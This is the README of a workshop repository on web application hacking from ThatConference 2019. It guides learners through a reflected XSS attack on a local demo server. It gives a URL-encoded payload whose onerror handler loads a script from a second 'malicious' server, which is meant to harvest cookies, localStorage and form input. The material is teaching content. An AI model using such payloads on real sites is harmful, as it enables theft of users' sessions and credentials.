# Intro to Hacking Web Applications
## ThatConference 2019

Welcome!

This repo is intended to help illustrate some basic hacking techniques against web applications per my workshop at
ThatConference 2019.

### Setup

Clone this repo, then `npm i` to install dependencies for the examples.

`node index.js` should then fire up the example web server, which you can access at `http://localhost:3000`.

### Notes

Look at the JavaScript file being loaded by the webpage. Do you notice anything curious?

What if you change the URL of the webpage to:

   * http://localhost:3000/?errorMessage=%3Cimg%20src=%22https://images.sk-static.com/images/media/profile_images/artists/29315/huge_avatar%22%20/%3E
   
What happened? You just witnessed a reflected XSS attack!

The example isn't too horrifying... but let's imagine a worse scenario.

In a new terminal, run `node malicious.js`. This will stand up a second web server with malicious intentions (note: it won't harm your system!).

What if the URL for the original web app included a malicious JavaScript snippet that attempted to grab any values stored in cookies, localstorage
or form inputs and send those back to a different web server waiting for this sort of response.

Change the URL to:

  * http://localhost:3000/?errorMessage=%3Cimg%20src=%22%22%20onerror=%22var%20s%20=%20document.createElement(%20%27script%27%20);%20s.setAttribute(%20%27src%27,%20%27http://localhost:3001/getFormValues.js%27%20);%20document.body.appendChild(%20s%20);%22/%3E
  
Now, start typing into the inputs of the original web application... and watch the terminal of the malicious app!